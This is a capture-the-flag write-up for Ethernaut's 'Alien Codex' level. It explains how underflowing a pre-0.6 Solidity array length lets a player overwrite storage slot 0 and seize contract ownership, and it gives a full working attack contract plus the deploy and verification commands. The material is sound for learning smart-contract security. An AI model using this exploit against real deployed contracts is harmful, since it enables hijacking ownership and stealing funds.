# 19 - Alien Codex

## Overview

- **Difficulty:** 8/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x0b0d9977f48ec9984cdae53a4e930a479809c09f`](https://sepolia.etherscan.io/address/0x0b0d9977f48ec9984cdae53a4e930a479809c09f)
- **Attack Contract (`AlienCodexCaller`):** [`0x07926fbde34d54028e542ae6a78d19850683cc28`](https://sepolia.etherscan.io/address/0x07926fbde34d54028e542ae6a78d19850683cc28)
- **Transactions:**
  - **1. Deploy & Exploit (`AlienCodexCaller`):** [`0x4c89b6621cc02aa8ceea86b6e8819c6aeac5c83da588862abc0c4a674510de46`](https://sepolia.etherscan.io/tx/0x4c89b6621cc02aa8ceea86b6e8819c6aeac5c83da588862abc0c4a674510de46)
  - **2. Level Submission:** [`0xae5ab7209a8c8363252188f8fe6df214e3e52c61a865f69e539419cf81099dc8`](https://sepolia.etherscan.io/tx/0xae5ab7209a8c8363252188f8fe6df214e3e52c61a865f69e539419cf81099dc8)

---

## Objective

Claim ownership of the `AlienCodex` contract instance.

---

## Contract Analysis

The target contract is located in [`src/19-alien-codex/AlienCodex.sol`](./AlienCodex.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

The inherited `Ownable-05.sol` contract defines:

```solidity
contract Ownable {
    address private _owner;
    ...
    function owner() public view returns (address) {
        return _owner;
    }
}
```

---

## Vulnerability Breakdown

This challenge exploits two distinct features of legacy EVM / Solidity implementations:

1. **Unchecked array length underflow** (pre-Solidity 0.6.0).
2. **Deterministic storage layout of dynamic arrays**.

### 1. Storage Slot Layout

EVM storage consists of $2^{256}$ slots, each 32 bytes wide. Variables declared consecutively are packed into slots from right-to-left if their combined size is $\le 32$ bytes:

| Slot  | Variable                  |   Size   | Offset in Slot  | Description                                 |
| :---: | :------------------------ | :------: | :-------------: | :------------------------------------------ |
| **0** | `_owner` (from `Ownable`) | 20 bytes | `0x00` – `0x13` | Bits 0..159 (current contract owner)        |
| **0** | `contact`                 |  1 byte  |     `0x14`      | Bit 160 (flag to pass `contacted` modifier) |
| **1** | `codex.length`            | 32 bytes | `0x00` – `0x1f` | Length of dynamic array `codex`             |

### 2. How Dynamic Arrays Are Stored in EVM

For any dynamically sized array `codex` declared at slot $p$ (here, $p = 1$):

- **Slot $p$ ($1$):** Holds the **length** of the array.
- **Data elements:** The array elements are stored contiguously starting at storage slot:
  $$h = \text{keccak256}(p) = \text{keccak256}(1)$$
- Element `codex[0]` is at slot: $h + 0$
- Element `codex[1]` is at slot: $h + 1$
- In general, element `codex[k]` is at slot:
  $$\text{slot}(k) = (h + k) \pmod{2^{256}}$$

### 3. The Array Length Underflow

Notice the function `retract()`:

```solidity
function retract() public contacted {
    codex.length--;
}
```

In Solidity `< 0.6.0`, modifying `.length` directly was legal. Furthermore, before Solidity `0.8.0`, integer operations had no built-in overflow/underflow protection.

When `AlienCodex` is deployed:

- Initial `codex.length == 0`.
- Calling `retract()` executes `0 - 1`.
- The length underflows to:
  $$\text{codex.length} = 2^{256} - 1 = \text{type}(uint256).\text{max}$$

With `codex.length = 2^256 - 1`, the array now covers the **entire storage space of the contract**! Any array bounds check (`require(i < codex.length)`) will pass for any index $i$.

### 4. Calculating the Index to Overwrite Slot 0

Since `codex[i]` writes to slot $(h + i) \pmod{2^{256}}$, we can write to **Slot 0** (where `_owner` is stored) by choosing an index $i$ such that:

$$(h + i) \equiv 0 \pmod{2^{256}}$$
$$i = 2^{256} - h \equiv 0 - h \pmod{2^{256}}$$

Where:
$$h = \text{uint256}(\text{keccak256}(\text{abi.encode}(uint256(1))))$$

Because modern Solidity 0.8+ reverts on underflow, we perform the subtraction inside an `unchecked` block:

```solidity
uint256 h = uint256(keccak256(abi.encode(uint256(1))));
uint256 i;
unchecked {
    i -= h; // i = 0 - h
}
```

### 5. Formatting the Owner Data

Slot 0 holds `_owner` in the lower 20 bytes (bits 0–159). When writing 32 bytes via `revise(i, _content)`:

- Converting an address `msg.sender` to `uint160`, then `uint256`, and finally `bytes32`:
  ```solidity
  bytes32(uint256(uint160(msg.sender)))
  ```
- This places the 20-byte address in the least significant bytes (rightmost bytes) of the 32-byte word, perfectly aligning with `_owner` at Slot 0!

---

## Attack Contract

The entire attack is automated inside the constructor of [`src/19-alien-codex/AlienCodexCaller.sol`](./AlienCodexCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
    function owner() external returns (address);
}

contract AlienCodexCaller {
    error AlienCodexCaller__NotOwner();

    /*
    Storage Layout:
    slot 0: owner (20 bytes), contact (1 byte)
    slot 1: length of the array codex

    // Array element storage:
    // slot where array element is stored = keccak256(slot) + index
    // h = keccak256(1)
    slot h + 0: codex[0]
    slot h + 1: codex[1]
    slot h + 2: codex[2]
    ...

    Find i such that:
    (h + i) mod 2^256 = 0
    i = 0 - h
    */

    constructor(IAlienCodex alienCodex) {
        // Step 1: Pass contacted modifier check
        alienCodex.makeContact();

        // Step 2: Underflow codex.length from 0 to 2^256 - 1
        alienCodex.retract();

        // Step 3: Calculate slot offset to wrap around to Slot 0
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        // Step 4: Overwrite Slot 0 with msg.sender (our player EOA)
        alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));

        // Step 5: Verify we successfully claimed ownership
        require(alienCodex.owner() == msg.sender, AlienCodexCaller__NotOwner());
    }
}
```

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy Attack Contract

Deploy `AlienCodexCaller`, passing the `AlienCodex` instance address to the constructor:

```bash
forge create src/19-alien-codex/AlienCodexCaller.sol:AlienCodexCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --broadcast \
  --constructor-args 0x0b0d9977f48ec9984cdae53a4e930a479809c09f
```

- **Deploy & Exploit Tx:** [`0x4c89b6621cc02aa8ceea86b6e8819c6aeac5c83da588862abc0c4a674510de46`](https://sepolia.etherscan.io/tx/0x4c89b6621cc02aa8ceea86b6e8819c6aeac5c83da588862abc0c4a674510de46)
- **Deployed Contract Address:** [`0x07926fbde34d54028e542ae6a78d19850683cc28`](https://sepolia.etherscan.io/address/0x07926fbde34d54028e542ae6a78d19850683cc28)

### 2. Verify Ownership

Query `owner()` to confirm that ownership was successfully transferred to the player wallet:

```bash
cast call 0x0b0d9977f48ec9984cdae53a4e930a479809c09f "owner()(address)" --rpc-url sepolia
# Output: 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 (Player EOA)
```

### 3. Submit Level

Submit the level instance on the Ethernaut dashboard:

- **Submission Tx:** [`0xae5ab7209a8c8363252188f8fe6df214e3e52c61a865f69e539419cf81099dc8`](https://sepolia.etherscan.io/tx/0xae5ab7209a8c8363252188f8fe6df214e3e52c61a865f69e539419cf81099dc8)

---

## Key Security Takeaways

1. **Deprecation of Direct `.length` Assignment:**
   Starting in Solidity `0.6.0`, array `.length` was made strictly read-only to prevent this exact vulnerability. Dynamic arrays can now only be resized through `.push()` and `.pop()`.
2. **Built-in Overflow/Underflow Checks:**
   Starting in Solidity `0.8.0`, all arithmetic operations automatically revert on underflow and overflow unless explicitly wrapped in an `unchecked` block.
3. **EVM Storage Wraparound:**
   The EVM storage space behaves as a circular addressing ring modulo $2^{256}$. If an array's boundary check is compromised, any slot—including slot 0 (owner), proxy implementation slots, or balances—can be written to arbitrarily.
